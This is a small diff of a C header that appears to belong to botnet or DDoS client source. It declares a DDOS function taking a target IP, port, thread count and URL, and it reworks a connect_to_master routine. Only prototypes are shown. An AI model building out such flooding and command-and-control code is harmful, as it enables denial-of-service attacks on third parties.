@@ -31,6 +31,6 @@ int make_socket(void);
 
 void wait_and_close(int f_write);
 void DDOS(int type, char *target_ip, short port, int n_thrds, char *target_url);
-void connect_to_master(char *to_con, int port);
-
+void connect_to_master();
+void init(char *to_con, int port);
 #endif
